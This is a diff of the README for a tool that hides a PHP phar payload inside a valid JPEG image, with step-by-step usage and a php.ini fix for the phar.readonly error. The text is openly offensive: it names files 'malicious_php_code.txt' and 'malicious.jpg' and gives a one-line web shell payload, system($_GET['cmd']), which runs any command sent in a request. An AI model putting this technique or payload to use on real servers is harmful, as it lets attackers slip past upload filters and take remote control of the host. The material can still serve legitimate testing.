@@ -8,34 +8,37 @@ This is a simple tool to add a phar payload at the end of a valid jpeg image.
 
 ## Usage
 
-2. Choose a php payload finishing by `__HALT_COMPILER();` for example :
+Clone the repo
+git clone https://github.com/Sarapuce/jpeg-phar-fusion.git
 
-`<?php system($_GET["cmd"]); __HALT_COMPILER(); ?>`
+Choose a php payload finishing by __HALT_COMPILER(); for example :
+<?php system($_GET["cmd"]); __HALT_COMPILER(); ?>
 
-3. Create the payload with the script
+Place the php code int the text file called "malicious_php_code.txt"
 
-`python3 phar_creator.py '<?php system($_GET["cmd"]); __HALT_COMPILER(); ?>'`
+Create the payload with the script
+python3 phar_creator.py
 
-4. The file is in `payload.jpg`
+The file is in malicious.jpg
 
-5. Run "php include.php" to see the code executed!!
+Run "php include.php" to see the code executed!!
 
+## If It doesn't work 😡
+Do you have the error
 
-
-## It doesn't work 😡
-Do you have the error 
-> PHP Fatal error:  Uncaught UnexpectedValueException: creating archive "payload.phar" disabled by the php.ini setting phar.readonly
+PHP Fatal error: Uncaught UnexpectedValueException: creating archive "payload.phar" disabled by the php.ini setting phar.readonly
 
 You need to enable the phar creation in php.ini
 
-To locate your php.ini 
+To locate your php.ini
 
-`php --ini`
+php --ini
 
 Then edit this line in your file
 
-`;phar.readonly = Off`
+;phar.readonly = Off
 
 into
 
-`phar.readonly = Off`
+phar.readonly = Off
+
